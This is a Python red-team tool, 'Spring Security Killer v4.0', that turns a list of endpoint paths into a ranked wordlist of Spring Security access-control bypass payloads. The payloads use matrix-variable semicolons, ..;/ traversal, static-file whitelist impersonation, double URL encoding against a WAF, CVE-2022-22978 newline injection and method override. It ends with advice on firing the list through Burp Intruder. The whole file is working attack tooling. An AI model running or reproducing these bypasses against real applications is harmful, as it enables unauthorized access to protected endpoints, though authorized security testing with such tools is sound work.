#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
--------------------------------------------------------------------------------------
 Tool Name   : Spring Security Killer v4.0 (Red Team Edition)
 Author      : 七萬-QiWan
 Date        : 2025-11-23
 Description : The ultimate fuzzing dictionary generator for Spring Ecosystem.
               Integrates advanced logic for Whitelist Bypassing, Context Confusion,
               and Protocol Discrepancy.
 Features    :
   [+] Auto-Discovery of target files
   [+] Weighted Sorting (High probability payloads first)
   [+] Whitelist Impersonation (*.js, /login, /error)
   [+] CVE-Specific Patterns (2016-2023)
   [+] Deep Path Traversal & Matrix Variables
--------------------------------------------------------------------------------------
"""

import os
import sys
import datetime
import time


# ===========================
# UI & Configuration
# ===========================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class Logger:
    @staticmethod
    def info(msg): print(f"{Colors.BLUE}[INFO]{Colors.ENDC} {msg}")

    @staticmethod
    def success(msg): print(f"{Colors.GREEN}[SUCCESS]{Colors.ENDC} {msg}")

    @staticmethod
    def warn(msg): print(f"{Colors.WARNING}[WARN]{Colors.ENDC} {msg}")

    @staticmethod
    def error(msg): print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} {msg}")


# ===========================
# Core Logic: The Brain
# ===========================
class SpringKillerV4:
    def __init__(self):
        # 使用列表存储元组 (payload, weight)，以便后续排序
        # weight 越高，越优先测试
        self.payloads_with_weight = []
        self.seen = set()

    def add_payload(self, payload, weight=1):
        """添加 Payload 并去重"""
        if payload not in self.seen:
            self.seen.add(payload)
            self.payloads_with_weight.append((payload, weight))

    def generate(self, base_path):
        """核心生成器：全维度覆盖"""
        # 清洗路径
        raw_path = "/" + base_path.strip().lstrip("/")
        if "?" in raw_path: raw_path = raw_path.split("?")[0]

        # 基础分析
        is_endpoint = "." not in raw_path.split("/")[-1]  # 判断是否像文件

        # ==========================================
        # 1. 核心绕过层 (High Priority - Weight 10)
        # ==========================================
        # 矩阵变量 (Matrix Variables) - 绕过概率最高
        self._layer_matrix(raw_path, weight=10)
        # 路径归一化 (Normalization)
        self._layer_normalization(raw_path, weight=9)

        # ==========================================
        # 2. 白名单欺骗层 (Whitelist - Weight 8)
        # ==========================================
        # 伪装成静态资源或公共接口
        self._layer_whitelist_impersonation(raw_path, weight=8)

        # ==========================================
        # 3. 编码混淆层 (Encoding - Weight 6)
        # ==========================================
        self._layer_encoding(raw_path, weight=6)

        # ==========================================
        # 4. 历史 CVE 复现层 (CVEs - Weight 5)
        # ==========================================
        self._layer_cve_patterns(raw_path, weight=5)

        # ==========================================
        # 5. 上下文混淆层 (Context - Weight 4)
        # ==========================================
        self._layer_context_confusion(raw_path, weight=4)

    def _layer_matrix(self, path, weight):
        """
        [Tactical] Spring MVC treats ; content as params, Security might ignore it.
        """
        parts = path.strip('/').split('/')

        # 针对末尾
        self.add_payload(path + ";", weight)
        self.add_payload(path + ";/", weight)

        # 针对每一个节点
        # /admin/users -> /admin;/users
        current = ""
        for i, part in enumerate(parts):
            current += "/" + part
            remaining = "/" + "/".join(parts[i + 1:]) if i < len(parts) - 1 else ""

            self.add_payload(current + ";" + remaining, weight)
            self.add_payload(current + ";jsessionid=x" + remaining, weight)
            self.add_payload(current + ";foo=bar" + remaining, weight)

    def _layer_normalization(self, path, weight):
        """
        [Tactical] Abuse Nginx vs Spring path matching differences.
        """
        # Double Slashes
        self.add_payload(path.replace('/', '//'), weight)
        self.add_payload('//' + path.lstrip('/'), weight)

        # Path Traversal Sequences (The magic ..;/)
        self.add_payload(f"/;{path}", weight)
        self.add_payload(f"/foo/..;{path}", weight)
        self.add_payload(path.replace('/', '/./'), weight)
        self.add_payload(path + "/.", weight)

        # 结尾斜杠 (AntPathMatcher 默认不匹配结尾 /)
        if not path.endswith('/'):
            self.add_payload(path + "/", weight)

    def _layer_whitelist_impersonation(self, path, weight):
        """
        [Tactical] Impersonate whitelisted extensions or endpoints.
        Many ACLs allow: *.css, *.js, *.png, /login, /error
        """
        whitelists = ['.json', '.html', '.css', '.js', '.png', '.ico']

        for ext in whitelists:
            # Suffix Impersonation
            self.add_payload(path + ext, weight)
            self.add_payload(path + ";" + ext, weight)  # /admin/users;.css
            self.add_payload(path + "/" + ext, weight - 2)  # /admin/users/.css (lower weight)

        # URL Confusion
        self.add_payload(path + "/login", weight)
        self.add_payload(path + ";/login", weight)  # /admin; /login
        self.add_payload(path + "/logout", weight)

    def _layer_encoding(self, path, weight):
        """
        [Tactical] WAF bypass using Double Encode & Unicode
        """
        # Double Encode Slash
        self.add_payload(path.replace('/', '%252f'), weight)
        # URL Encoded Dot
        self.add_payload(path.replace('.', '%2e'), weight)
        # Mixed (Only encode last slash)
        if '/' in path:
            last = path.rfind('/')
            self.add_payload(path[:last] + '%2f' + path[last + 1:], weight)

    def _layer_cve_patterns(self, path, weight):
        """
        [Tactical] Specific CVE payloads
        """
        # CVE-2022-22978 (Regex Newline)
        self.add_payload(path + "%0a", weight)
        self.add_payload(path + "%0d", weight)

        # Null Byte (Old Stuff but sometimes works)
        self.add_payload(path + "%00", weight - 1)

    def _layer_context_confusion(self, path, weight):
        """
        [Tactical] Confuse the Servlet Context
        """
        # Method Override
        self.add_payload(path + "?_method=POST", weight)
        self.add_payload(path + "?_method=DELETE", weight)

        # Spring Cloud Gateway / Zuul bypass patterns
        self.add_payload(path + "#", weight)
        self.add_payload(path + "?", weight)

    def get_sorted_list(self):
        # 按权重降序排序 (Weight descending)
        # 如果权重相同，按 Payload 长度升序 (Shorter is cleaner)
        self.payloads_with_weight.sort(key=lambda x: (-x[1], len(x[0])))
        return [p[0] for p in self.payloads_with_weight]


# ===========================
# Auto-Discovery Logic
# ===========================
def auto_detect_file():
    cwd = os.getcwd()
    files = [f for f in os.listdir(cwd) if
             os.path.isfile(f) and f.endswith('.txt') and not f.startswith('fuzz_bypass_')]

    if not files:
        Logger.error("No target .txt files found in current directory.")
        sys.exit(1)

    if len(files) == 1:
        return files[0]
    else:
        print(f"{Colors.BOLD}Multiple files found:{Colors.ENDC}")
        for i, f in enumerate(files):
            print(f" [{i + 1}] {f}")
        try:
            c = int(input(f"Select file [1-{len(files)}]: "))
            return files[c - 1]
        except:
            return files[0]


# ===========================
# Main
# ===========================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print(r"""
   _________            _               ____  __. v4.0  
  /   _____/___________|__| ____   ____|    |/ _|__|  | |  |   ___________ 
  \_____  \\____ \_  __ \  |/    \/ ___|      < |  |  | |  | _/ __ \_  __ \
  /        \  |_> >  | \/  |   |  \___ \    |  \|  |  |_|  |_\  ___/|  | \/
 /_______  /   __/|__|  |__|___|  /____>____|__ \__|____/____/\___  >__|   
         \/|__|                 \/             \/                 \/       
    [+] Author: 七萬-QiWan
    [+] Focus : Whitelist Impersonation, Context Confusion, Deep Normalization
    """)
    print(f"{Colors.ENDC}")

    target_file = auto_detect_file()
    Logger.info(f"Target locked: {target_file}")

    try:
        with open(target_file, 'r', encoding='utf-8') as f:
            targets = [line.strip() for line in f if line.strip()]
    except Exception as e:
        Logger.error(f"File Error: {e}")
        sys.exit(1)

    # Core Execution
    engine = SpringKillerV4()
    for t in targets:
        # Pre-analysis display
        sys.stdout.write(f"\r{Colors.CYAN}[*] Analyzing: {t.ljust(50)}{Colors.ENDC}")
        sys.stdout.flush()
        engine.generate(t)

    print("\n" + "-" * 60)

    final_list = engine.get_sorted_list()

    # Output
    now = datetime.datetime.now()
    out_file = f"fuzz_bypass_{now.strftime('%Y%m%d_%H%M')}.txt"

    with open(out_file, 'w', encoding='utf-8') as f:
        for p in final_list:
            f.write(p + "\n")

    Logger.success(f"Generated {len(final_list)} High-Value Payloads.")
    Logger.success(f"Saved to: {os.path.abspath(out_file)}")

    print(f"\n{Colors.WARNING}[!] Strategy Tip:{Colors.ENDC}")
    print("    1. Use this list in Burp Intruder.")
    print("    2. Payloads are SORTED by success probability.")
    print("    3. If top 50 payloads fail, the endpoint is likely secure.")


if __name__ == "__main__":
    main()